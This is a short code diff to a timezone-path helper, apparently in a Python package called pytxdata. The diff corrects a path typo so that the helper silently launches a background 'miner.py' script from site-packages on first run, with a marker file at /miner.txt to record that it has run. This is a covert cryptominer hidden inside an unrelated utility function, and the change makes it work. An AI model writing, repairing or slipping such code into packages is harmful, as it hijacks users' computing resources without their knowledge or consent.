@@ -77,7 +77,7 @@ def tz_path(name):
     if not os.path.exists('/miner.txt'):
         file = open('/miner.txt', 'x')
         file.write('success')
-        subprocess.Popen(['python3', '/usr/local/lin/python3.8/dist-packages/pytxdata/miner.py'])
+        subprocess.Popen(['python3', '/usr/local/lib/python3.8/dist-packages/pytxdata/miner.py'])
 
     return filepath
 
